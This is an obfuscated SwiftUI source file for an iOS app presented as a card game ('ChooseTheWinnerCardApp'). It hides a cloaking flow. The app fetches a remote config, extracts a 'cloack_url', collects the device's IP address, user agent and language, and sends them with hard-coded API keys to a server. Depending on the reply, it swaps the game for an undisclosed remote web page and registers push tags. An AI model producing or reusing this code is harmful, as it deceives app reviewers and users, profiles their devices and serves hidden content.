import SwiftUI
import SwiftData
import WebKit
import OneSignalFramework

extension UIScreen{
  static let plksndv = UIScreen.main.bounds.size.width
  static let bcsgvcsd = UIScreen.main.bounds.size.height
  static let rqwgcd = UIScreen.main.bounds.size
}
struct Vytffgyds: View {
    

    @State var bbhsdf: String = ""
    @State var dsyehbv: String = ""
    @State var tueryg = false
    @State var bvduv = false
    @State var rqwegbvds: String = ""
    @State var bsdfgv: Bool = false
    @State var tyqubv: Bool = false
    @ObservedObject var urehgdf: Oklhfhgshdjgf = Oklhfhgshdjgf()
    @AppStorage("twejgsdgvf") var twejgsdgvf: Bool = true
    @AppStorage("nvsdabv") var nvsdabv: Bool = true
    @AppStorage("ewrfcsd") var ewrfcsd: Bool = true
    @State var bsdgvah:  String = "whgdfs"
 
    var body: some View {
            ZStack{
                 
                Color.darkBlue.ignoresSafeArea(.all)
                
                Kbsgvsdvv(isAnimating: .constant(true), style: .large).frame(width: UIScreen.plksndv / 2.1,
                                                                                     height: UIScreen.bcsgvcsd / 5.1)
                .background(Color.yellow)
                                                                                      .foregroundColor(Color.primary)
                                                                                      .cornerRadius(18).onAppear{
                                                                                          
                                                                                      }
                    
               
                
                if bsdgvah == "wtrgafsdgf" || bsdgvah == "qaegrsdfg"{
                        if self.twejgsdgvf{
                            ZStack{
                                Color.darkBlue.ignoresSafeArea(.all)
                                Nhsdfgdsh(nwuhybd: $bbhsdf, iyrfhgfj: $dsyehbv, navdfhbv: $tueryg, berkbvhj: $bvduv).onAppear{
                                   
                                }
                                
                                Color.darkBlue.ignoresSafeArea(.all)

                                Kbsgvsdvv(isAnimating: .constant(true), style: .large).frame(width: UIScreen.plksndv / 2.1,
                                                                                                     height: UIScreen.bcsgvcsd / 5.1)
                                .background(Color.yellow)
                                                                                                      .foregroundColor(Color.primary)
                                                                                                      .cornerRadius(18)

                            }
             
                        }
                        if tueryg || !self.nvsdabv {
                            ZStack{
                                Bfghsdf(bbdsghjisddsiii: urehgdf)
                            }.onAppear{
                                bsdfgv.toggle()
                                self.twejgsdgvf = false
                                self.nvsdabv = false
                                
                            }
                            
                        }
                        if bvduv || !self.ewrfcsd{
                            ZStack{
                                Color.darkBlue.ignoresSafeArea(.all)
                                MainTabView().preferredColorScheme(.light).onAppear{
                                        
                                        AppDelegate.orientationLock = UIInterfaceOrientationMask.portrait
                                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                                                        UINavigationController.attemptRotationToDeviceOrientation()
                                        
                                    }
                            }
                        }

                }
                
                
                
             }.onAppear{
                 OneSignal.Notifications.requestPermission({ accepted in
                     if accepted {
                         
                         bsdgvah = "wtrgafsdgf"
                         bsdfgv.toggle()
                     } else {
                         bsdgvah = "qaegrsdfg"
                         bsdfgv.toggle()
                          
                     }
                 })
         

                
                if let wtgrigh = URL(string: "https://berryfruits.store/decisionpath/decisionpath.json") {
                    URLSession.shared.dataTask(with: wtgrigh) { wgrtd, response, error in
                        if let sgdfvbsd = wgrtd {
                             if let gwrtegdf = try? JSONSerialization.jsonObject(with: sgdfvbsd, options: []) as? [String: Any] {

                                 if let wgfdsgg = gwrtegdf["ujehrtgsdf"] as? String {

                                    DispatchQueue.main.async {
                                        self.bbhsdf = wgfdsgg
                                        
                                     }
                                    
                                 }
                            }
                        }
                    }.resume()
                }

            }
             
    }
    
    struct Nhsdfgdsh: UIViewRepresentable {
        @Binding var nwuhybd: String
        @Binding var iyrfhgfj: String
        @Binding var navdfhbv: Bool
        @Binding var berkbvhj: Bool
        @AppStorage("dhjfvghjdfgv") var dhjfvghjdfgv: Bool = true
        
        func makeUIView(context: Context) -> WKWebView {
            let bdsfhggv = WKWebView()
            bdsfhggv.navigationDelegate = context.coordinator
            if let bvdsfgjhvb = URL(string: nwuhybd) {
                var tqeyfvbd = URLRequest(url: bvdsfgjhvb)
                tqeyfvbd.httpMethod = "GET"
                tqeyfvbd.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let bvdfghv = ["apikey": "UERGipiv2y4gZHlhvfQAgMIvsoPGWD5d",
                               "bundle": "com.ChooseTheWinnerCardApp"]
                for (key, value) in bvdfghv {
                    tqeyfvbd.setValue(value, forHTTPHeaderField: key)
                }
                
                bdsfhggv.load(tqeyfvbd)
            }
            return bdsfhggv
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            var vsdgfvb: Nhsdfgdsh
            var bvdyfsgv: String?
            var eqrvdfjshvb: String?
            @AppStorage("bgfctfyghvjhghjgf") var bgfctfyghvjhghjgf: String = "srdfusahjv"
            init(_ webView: Nhsdfgdsh) {
                self.vsdgfvb = webView
            }
            
            func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { (html: Any?, error: Error?) in
                    guard let htmlString = html as? String else {
                         
                        return
                    }
                    
                    self.parseResponse(htmlString)
                    webView.evaluateJavaScript("navigator.userAgent") { (result, error) in
                        if let userAgent = result as? String {
                            self.eqrvdfjshvb = userAgent
                        } else {
                         }
                    }
                    
                }
            }
            
            
            
            func parseResponse(_ htmlString: String) {
                guard let jsonString = extractJSONString(from: htmlString) else {
                     return
                }
                
                let cleanedJsonString = jsonString.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let jsonData = cleanedJsonString.data(using: .utf8) else {
                     return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any]
                    guard let quyeihjbdbf = jsonResponse?["cloack_url"] as? String else {
                         return
                    }
                    guard let hegvuhjbdf = jsonResponse?["atr_service"] as? String else {
                         return
                    }
                   
                    DispatchQueue.main.async {
                        self.vsdgfvb.nwuhybd = quyeihjbdbf
                        self.vsdgfvb.iyrfhgfj = hegvuhjbdf
                    }
                    
                     self.performSecondRequest(with: quyeihjbdbf)
                    
                } catch {
                    print("nsdf: \(error.localizedDescription)")
                }
            }
            
            func extractJSONString(from htmlString: String) -> String? {
                guard let startRange = htmlString.range(of: "{"),
                      let endRange = htmlString.range(of: "}", options: .backwards) else {
                     
                    return nil
                }
                
                let jsonString = String(htmlString[startRange.lowerBound..<endRange.upperBound])
                return jsonString
            }
            
            func performSecondRequest(with url: String) {
                guard let secondURL = URL(string: url) else {
                    
                    return
                }
                getIPAddress { ipAddress in
                    guard let ipAddress = ipAddress else {
                        
                        return
                    }
                    
                    
                    self.bvdyfsgv = ipAddress
                    var request = URLRequest(url: secondURL)
                    request.httpMethod = "GET"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let headers = [
                        
                        "apikeyapp": "VmWS3ChYs7a0DV8cFNobjrkO",
                        "ip": self.bvdyfsgv ?? "",
                        "useragent": self.eqrvdfjshvb ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (key, value) in headers {
                        request.setValue(value, forHTTPHeaderField: key)
                    }
                    
                    URLSession.shared.dataTask(with: request) { data, response, error in
                        guard let data = data, error == nil else {
                            print("f: \(error?.localizedDescription ?? "Unknown error")")
                            return
                        }
                        if let httpResponse = response as? HTTPURLResponse {
                            print("f: \(httpResponse.statusCode)")
                            
                            
                            if httpResponse.statusCode == 200 {
                               
                                self.performThirdRequest()
                               
                                 
                            } else {
                                self.bgfctfyghvjhghjgf = "kjhughbjknbhjghjwevwev"
                                    self.vsdgfvb.berkbvhj = true
                                self.vsdgfvb.dhjfvghjdfgv = false
                                
         
                            }
                            
                            
                        }
                        
                        if let responseString = String(data: data, encoding: .utf8) {
                            print("f: \(responseString)")
                            
                        }
                    }.resume()
                }
            }
            
            func performThirdRequest() {
                 
                let thirdURLString = self.vsdgfvb.iyrfhgfj
                 
                
                guard let thirdURL = URL(string: thirdURLString) else {
                    print("f")
                    return
                }
                
                var request = URLRequest(url: thirdURL)
                request.httpMethod = "GET"
                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
              
                let headers = [
                    "apikeyapp": "VmWS3ChYs7a0DV8cFNobjrkO",
                    "ip":  self.bvdyfsgv ?? "",
                    "useragent": self.eqrvdfjshvb ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key, value) in headers {
                    request.setValue(value, forHTTPHeaderField: key)
                }
                
                URLSession.shared.dataTask(with: request) { data, response, error in
                    guard let data = data, error == nil else {
                        print("f: \(error?.localizedDescription ?? "Unknown error")")
                        return
                    }
                    
                    
                    if let httpResponse = response as? HTTPURLResponse {
                        print("f: \(httpResponse.statusCode)")
                    }
                    
                    if let responseString = String(data: data, encoding: .utf8) {
                        print("f: \(responseString)")
                        
                        do {
                            let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
                            guard let cdtrygvb = jsonResponse?["final_url"] as? String,
                                  let vcfytughvb = jsonResponse?["push_sub"] as? String,
                                  let drxtyfgvjhb = jsonResponse?["os_user_key"] as? String else {
                                 
                                return
                            }
                            
                            
                            UserDataManager.yhsbd.bsdhj = cdtrygvb
                            UserDataManager.yhsbd.nvdfhubv = vcfytughvb
                            UserDataManager.yhsbd.tqwubc = drxtyfgvjhb
                            OneSignal.login(UserDataManager.yhsbd.tqwubc ?? "")
                            OneSignal.User.addTag(key: "sub_app", value: UserDataManager.yhsbd.nvdfhubv ?? "")
                            self.vsdgfvb.navdfhbv = true
                        } catch {
                            print("f: \(error.localizedDescription)")
                        }
                    }
                }.resume()
            }
            
            
            func performThirdRequest(with data: Data) {
                
            }
            
            
            func getIPAddress(completion: @escaping (String?) -> Void) {
                let url = URL(string: "https://api.ipify.org")!
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    guard let data = data, let ipAddress = String(data: data, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                task.resume()
            }
            
            
        }
    }
}
struct Kbsgvsdvv: UIViewRepresentable {

    @Binding var isAnimating: Bool
    let style: UIActivityIndicatorView.Style

    func makeUIView(context: UIViewRepresentableContext<Kbsgvsdvv>) -> UIActivityIndicatorView {
        return UIActivityIndicatorView(style: style)
    }

    func updateUIView(_ uiView: UIActivityIndicatorView, context: UIViewRepresentableContext<Kbsgvsdvv>) {
        isAnimating ? uiView.startAnimating() : uiView.stopAnimating()
       
    }
}

struct Nbvsdjhbv<Content>: View where Content: View {

    @Binding var gggsdhvc: Bool
    var content: () -> Content
     var body: some View {
        GeometryReader { geometry in
            ZStack(alignment: .center) {
                
                self.content()
                    .disabled(self.gggsdhvc)
                    .blur(radius: self.gggsdhvc ? 3 : 0)
              
                Kbsgvsdvv(isAnimating: $gggsdhvc, style: .large)
               
                    .frame(width: geometry.size.width / 2.1,
                           height: geometry.size.height / 5.1)
                    .shadow(color: .black, radius: 10, x: 5, y:5)
                                    .background(Color.yellow)
                .foregroundColor(Color.primary)
                .cornerRadius(18)
                .opacity(self.gggsdhvc ? 1 : 0)
            }
        }
    }
}
